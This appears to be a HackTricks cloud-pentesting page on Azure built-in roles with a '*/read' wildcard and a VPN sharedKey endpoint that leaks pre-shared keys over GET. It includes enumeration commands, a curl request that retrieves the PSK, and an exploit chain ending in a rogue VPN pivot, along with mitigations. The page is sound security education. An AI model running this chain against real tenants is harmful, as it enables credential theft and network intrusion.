# Az - Over-Privileged RBAC Roles & VPN PSK Leak

{{#include ../../banners/hacktricks-training.md}}

## Over-Privileged Built-In Roles (*/read)

Azure built-in roles grant permissions through the `actions` array in a role definition. Generic roles (e.g., **Reader**) include a wildcard `*/read` action, granting read access across *all* resource providers. Unexpectedly, several service-specific built-in roles also include this `*/read`, leading to over-privileged identities.

Common affected roles (among others):

- Log Analytics Reader / Contributor
- App Compliance Automation Reader / Administrator
- Managed Applications Reader / Contributor / Operator
- Monitoring Reader / Contributor
- Resource Policy Contributor

With `*/read`, an attacker can:
- **Steal credentials**: Read Automation Account runbooks, deployment scripts, web app source and environment variables containing secrets.
- **Discover sensitive data**: Enumerate storage accounts, container registries, databases, backups, resource locks.
- **Plan further attacks**: List role assignments, diagnostics settings, NSGs, public IPs, virtual network gateways, Key Vault names.

### Enumerate Over-Privileged Roles

Use the Azure CLI to find roles with a `*/read` permission:
```bash
az role definition list \
  --query "[?permissions[?contains(actions, '*/read')]].{Name:roleName, Id:id}"
```
Assign one of these roles (or compromise a principal with it) to obtain broad read access.

## HTTP Method-Based Permission Enforcement

Azure enforces read vs sensitive operations by HTTP method:
- **GET** requests require only `*/read` permissions.
- **POST** requests (even with empty body) gate more sensitive APIs behind explicit action permissions.

Validate enforcement with a non-existent endpoint:

```bash
# GET -> 404 Not Found (read allowed)
curl -i -X GET \
  "https://management.azure.com/subscriptions/0000/resourceGroups/rg/providers/Microsoft.Network/nonexistent?api-version=2024-07-01" \
  -H "Authorization: Bearer $TOKEN"

# POST -> 403 Forbidden (read-only denied)
curl -i -X POST \
  "https://management.azure.com/subscriptions/0000/resourceGroups/rg/providers/Microsoft.Network/nonexistent?api-version=2024-07-01" \
  -H "Authorization: Bearer $TOKEN"
```

## VPN Gateway PSK Leak

A misimplemented VPN shared key endpoint uses **GET**, exposing the pre-shared key (PSK) to any principal with `*/read`:

```bash
GET https://management.azure.com/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Network/connections/{conn}/sharedKey?api-version=2024-07-01
```

```bash
curl -sS \
  -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Network/connections/$CONN/sharedKey?api-version=2024-07-01"
# Returns: { "value": "<PSK>" }
```

## Full Exploit Chain

1. Compromise or assign a low-privilege identity one of the affected service-specific roles.
2. Enumerate resources and secrets via `*/read` to locate the VPN connection name.
3. Issue the `GET .../sharedKey` request to retrieve the PSK.
4. Configure a rogue Site-to-Site VPN link using the PSK to pivot into on-premises and cloud networks.

## Mitigations & Recommendations

- **Avoid affected built-in roles**: Replace with custom least-privilege roles listing only required actions.
- **Limit role scope**: Assign roles to specific resource groups or individual resources, not broad subscriptions.
- **Audit role assignments**: Continuously review assignments; enforce just-in-time and just-enough-access principles.

## References

- Azure's Role Roulette: How Over-Privileged Roles and API Vulnerabilities Expose Enterprise Networks - https://www.token.security/blog/azures-role-roulette-how-over-privileged-roles-and-api-vulnerabilities-expose-enterprise-networks
- Azure VPN Gateway roles & permissions - https://learn.microsoft.com/en-us/azure/vpn-gateway/roles-permissions
- Binary Security: Azure API Management Reader Privesc - https://binarysecurity.no/posts/2024/11/apim-privesc

{{#include ../../banners/hacktricks-training.md}}